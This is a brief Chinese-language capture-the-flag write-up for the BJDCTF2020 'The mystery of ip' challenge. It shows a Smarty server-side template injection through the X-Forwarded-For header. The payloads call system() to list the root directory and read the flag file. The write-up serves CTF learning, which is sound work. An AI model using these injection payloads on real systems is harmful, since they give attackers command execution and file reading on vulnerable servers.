# [BJDCTF2020]The mystery of ip 1

- 进入页面，点击 `hint.php` ，查看源码，发现了 `<!-- Do you know why i know your ip? -->`

> <img src="../../IMG3/Screenshot 2024-06-16 194927.png">

- 既然是回显ip，那多半是 `X-Forwarded-For` ，发送到Repeater，添加X-Forwarded-For，发现输入什么回显什么

> <img src="../../IMG3/Screenshot 2024-06-16 195428.png">

- 既然是请求头回显，那一定是SSTI注入，查询配置

`X-Forwarded-For: {config}`

> <img src="../../IMG3/Screenshot 2024-06-16 200046.png">

- 确定是Smarty模板，查询根目录

`X-Forwarded-For: {if system("ls /")}{/if}`

> <img src="../../IMG3/Screenshot 2024-06-16 200317.png">

- 获取flag

`X-Forwarded-For: {if system("cat /flag")}{/if}`

> <img src="../../IMG3/Screenshot 2024-06-16 200405.png">